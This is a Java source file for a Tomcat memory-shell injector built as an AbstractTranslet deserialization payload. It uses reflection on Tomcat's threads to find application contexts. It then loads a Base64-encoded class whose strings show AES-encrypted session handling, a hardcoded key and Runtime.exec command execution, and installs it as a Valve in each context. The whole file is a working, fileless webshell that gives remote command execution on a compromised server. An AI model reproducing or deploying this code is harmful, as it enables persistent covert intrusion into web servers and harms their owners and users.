import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.Valve;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.core.StandardEngine;
import org.apache.catalina.core.StandardHost;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.*;


public class addValve extends AbstractTranslet {
    private String uri;
    private String serverName;
    private ArrayList<StandardContext> standardContext_=new ArrayList<>();
    private ArrayList<StandardContext> standardContext__=new ArrayList<>();
    public addValve() {
        super();
        this.getThread();
        ArrayList<StandardContext> standardCtx = this.getSTC();
        Object lisi=null;
        try {
            ClassLoader clzLoader = Thread.currentThread().getContextClassLoader();
            String code="yv66vgAAADQBBgoAPQB4CAB5CgB6AHsIAHwKADgAfQoAegB+CAB/CACACgB6AIEIAIILAIMAhAgAhQoAhgCHBwCICgA4AIkKAA4AigoAhgCLBwCMCgASAHgIAGQKABIAjQgAZggASQoAjgCPCgCOAJAIAJEKAJIAkwgAUwcAlAcAVgkAlQCWCgAdAJcKAJgAmQcAmgoAIgB4CgB6AJsKAJwAnQoAIgCeCgCGAJ8HAKAKAJUAoQoAmACiCgAdAKMKACgAfQcApAoAPAClCwCmAKcKAKgAqQoAqACqCgCrAKwHAK0KADMAeAoArgCvCgAzALAKALEAsgcAswoAMwC0CgA4ALUKALYAtwcAuAcAuQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQALTFZhbHZlaW1wbDsBAAZpbnZva2UBAFIoTG9yZy9hcGFjaGUvY2F0YWxpbmEvY29ubmVjdG9yL1JlcXVlc3Q7TG9yZy9hcGFjaGUvY2F0YWxpbmEvY29ubmVjdG9yL1Jlc3BvbnNlOylWAQABawEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAB3Nlc3Npb24BACBMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uOwEAAWMBABVMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAdoYXNoTWFwAQATTGphdmEvdXRpbC9IYXNoTWFwOwEACWNsekxvYWRlcgEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAGYUNsYXNzAQARTGphdmEvbGFuZy9DbGFzczsBAAtkZWZpbmVDbGFzcwEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAGZGVjb2RlAQACW0IBAARsaXNpAQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAB3J1bnRpbWUBABNMamF2YS9sYW5nL1J1bnRpbWU7AQALaW5wdXRTdHJlYW0BABVMamF2YS9pby9JbnB1dFN0cmVhbTsBAAxvdXRwdXRTdHJlYW0BAB9MamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW07AQAFYnl0ZXMBAAFhAQABSQEAA2NtZAEAB3JlcXVlc3QBACdMb3JnL2FwYWNoZS9jYXRhbGluYS9jb25uZWN0b3IvUmVxdWVzdDsBAAhyZXNwb25zZQEAKExvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXNwb25zZTsBABZMb2NhbFZhcmlhYmxlVHlwZVRhYmxlAQAUTGphdmEvbGFuZy9DbGFzczwqPjsBAA1TdGFja01hcFRhYmxlBwC4BwC6BwC7BwCzBwCkBwC8BwC9BwCtAQAKRXhjZXB0aW9ucwcAvgcAvwEAClNvdXJjZUZpbGUBAA5WYWx2ZWltcGwuamF2YQwAPgA/AQAJaWZjb25mbGFnBwC6DADAAMEBAAAMAMIAwwwAxADFAQAEUE9TVAEAEGU0NWUzMjlmZWI1ZDkyNWIMAMYAxwEAAXUHAMgMAMkAygEAA0FFUwcAywwAzADNAQAfamF2YXgvY3J5cHRvL3NwZWMvU2VjcmV0S2V5U3BlYwwAzgDPDAA+ANAMANEA0gEAEWphdmEvdXRpbC9IYXNoTWFwDADTANQHANUMANYA1wwA2ADZAQAVamF2YS5sYW5nLkNsYXNzTG9hZGVyBwDaDADbANwBAA9qYXZhL2xhbmcvQ2xhc3MHAN0MAN4AUgwA3wDgBwDhDADiAOMBABZzdW4vbWlzYy9CQVNFNjREZWNvZGVyDADkAOUHAOYMAOcAxQwA6ADpDADqAOsBABBqYXZhL2xhbmcvT2JqZWN0DADsAO0MAEUA7gwA7wDwAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwA8QDyBwDzDABFAEYHALwMAPQA9QwA9gD3BwD4DAD5APoBAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQcAvQwA+wD8DAD9AP4HALsMAP8BAAEAEGphdmEvbGFuZy9TdHJpbmcMAQEAzwwAPgECBwEDDAEEAQUBAAlWYWx2ZWltcGwBACRvcmcvYXBhY2hlL2NhdGFsaW5hL3ZhbHZlcy9WYWx2ZUJhc2UBACVvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXF1ZXN0AQAmb3JnL2FwYWNoZS9jYXRhbGluYS9jb25uZWN0b3IvUmVzcG9uc2UBABFqYXZhL2xhbmcvUnVudGltZQEAE2phdmEvaW8vSW5wdXRTdHJlYW0BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAeamF2YXgvc2VydmxldC9TZXJ2bGV0RXhjZXB0aW9uAQAMZ2V0UGFyYW1ldGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAZlcXVhbHMBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoBAAlnZXRNZXRob2QBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACmdldFNlc3Npb24BACIoKUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAeamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uAQAIcHV0VmFsdWUBACcoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9PYmplY3Q7KVYBABNqYXZheC9jcnlwdG8vQ2lwaGVyAQALZ2V0SW5zdGFuY2UBACkoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEACGdldEJ5dGVzAQAEKClbQgEAFyhbQkxqYXZhL2xhbmcvU3RyaW5nOylWAQAEaW5pdAEAFyhJTGphdmEvc2VjdXJpdHkvS2V5OylWAQADcHV0AQA4KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBABBqYXZhL2xhbmcvVGhyZWFkAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7AQAVZ2V0Q29udGV4dENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEACWxvYWRDbGFzcwEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBABFqYXZhL2xhbmcvSW50ZWdlcgEABFRZUEUBABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEACWdldFJlYWRlcgEAGigpTGphdmEvaW8vQnVmZmVyZWRSZWFk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";
            byte[] decode = Base64.getDecoder().decode(code);
            Class<?> aClass = clzLoader.loadClass("java.lang.ClassLoader");
            Method defineClass = aClass.getDeclaredMethod("defineClass",  byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            lisi = ((Class)defineClass.invoke(clzLoader, decode, 0, decode.length)).newInstance();
        }catch (Exception e){

        }
        for (StandardContext standardCtx_:standardCtx) {
            try {
                standardCtx_.addValve((Valve) lisi);
            }catch (Exception e){

            }
        }
    }
    public Object getField(Object object, String fieldName) {
        Field declaredField;
        Class clazz = object.getClass();
        while (clazz != Object.class) {
            try {

                declaredField = clazz.getDeclaredField(fieldName);
                declaredField.setAccessible(true);
                return declaredField.get(object);
            } catch (NoSuchFieldException e){}
            catch (IllegalAccessException e){}
            clazz = clazz.getSuperclass();
        }
        return null;
    }

    public void getThread() {
        Thread[] threads = (Thread[]) this.getField(Thread.currentThread().getThreadGroup(), "threads");
        Object object;
        for (Thread thread : threads) {

            if (thread == null) {
                continue;
            }
            if (thread.getName().contains("exec")) {
                continue;
            }
            Object target = this.getField(thread, "target");
            if (!(target instanceof Runnable)) {
                continue;
            }

            try {
                object = getField(getField(getField(target, "this$0"), "handler"), "global");
            } catch (Exception e) {
                continue;
            }
            if (object == null) {
                continue;
            }
            java.util.ArrayList processors = (java.util.ArrayList) getField(object, "processors");
            Iterator iterator = processors.iterator();
            while (iterator.hasNext()) {
                Object next = iterator.next();

                Object req = getField(next, "req");
                Object serverPort = getField(req, "serverPort");
                if (serverPort.equals(-1)){continue;}
                org.apache.tomcat.util.buf.MessageBytes serverNameMB = (org.apache.tomcat.util.buf.MessageBytes) getField(req, "serverNameMB");
                this.serverName = (String) getField(serverNameMB, "strValue");
                if (this.serverName == null){
                    this.serverName = serverNameMB.toString();
                }
                if (this.serverName == null){
                    this.serverName = serverNameMB.getString();
                }

                org.apache.tomcat.util.buf.MessageBytes uriMB = (org.apache.tomcat.util.buf.MessageBytes) getField(req, "uriMB");
                this.uri = (String) getField(uriMB, "strValue");
                if (this.uri == null){
                    this.uri = uriMB.toString();
                }
                if (this.uri == null){
                    this.uri = uriMB.getString();
                }

                this.getStandardContext();
                return;
            }
        }
    }

    public void getStandardContext() {
        Thread[] threads = (Thread[]) this.getField(Thread.currentThread().getThreadGroup(), "threads");
        for (Thread thread : threads) {
            if (thread == null) {
                continue;
            }
            if ((thread.getName().contains("Acceptor")) && (thread.getName().contains("http"))) {
                Object target = this.getField(thread, "target");
                HashMap children;
                Object jioEndPoint = null;
                try {
                    jioEndPoint = getField(target, "this$0");
                }catch (Exception e){}
                if (jioEndPoint == null){
                    try{
                        jioEndPoint = getField(target, "endpoint");
                    }catch (Exception e){ return; }
                }
                Object service = getField(getField(getField(getField(getField(jioEndPoint, "handler"), "proto"), "adapter"), "connector"), "service");
                StandardEngine engine = null;
                try {
                    engine = (StandardEngine) getField(service, "container");
                }catch (Exception e){}
                if (engine == null){
                    engine = (StandardEngine) getField(service, "engine");
                }
                children = (HashMap) getField(engine, "children");

                StandardHost standardHost=null;
                Iterator<Map.Entry<String ,StandardHost>> entryIterator=children.entrySet().iterator();
                while (entryIterator.hasNext()){
                    Map.Entry<String ,StandardHost> entry = entryIterator.next();
                    standardHost=entry.getValue();
                    children = (HashMap) getField(standardHost, "children");
                    Iterator iterator = children.keySet().iterator();
                    while (iterator.hasNext()){
                        String contextKey = (String) iterator.next();
                        if (!(this.uri.startsWith(contextKey))){continue;}
                        StandardContext standardContext = (StandardContext) children.get(contextKey);
                        this.standardContext_.add(standardContext);
                    }
                }
            }
        }
    }

    public ArrayList<StandardContext> getSTC(){
        for(int i=0;i<this.standardContext_.size();i++){
            if(!this.standardContext__.contains(this.standardContext_.get(i)))
                this.standardContext__.add(this.standardContext_.get(i));
        }
        return this.standardContext__;
    }
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}